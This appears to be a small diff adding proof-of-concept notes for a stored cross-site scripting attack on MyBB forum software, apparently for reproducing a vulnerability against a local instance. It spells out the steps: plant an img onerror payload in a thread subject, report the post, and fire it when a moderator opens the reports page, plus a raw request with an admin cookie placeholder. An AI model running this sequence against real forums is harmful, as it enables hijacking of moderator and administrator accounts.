@@ -1,0 +1,8 @@
+# (1) store  POST /newthread.php  subject=<img src=x onerror=...>
+# (2) report POST /report.php      action=do_report&type=post&pid=2&reason=3
+# (3) fire   GET  /modcp.php?action=reports  (as a moderator/admin)
+
+GET /modcp.php?action=reports HTTP/1.1
+Host: localhost:25850
+Cookie: mybbuser=<ADMIN uid_loginkey>
+
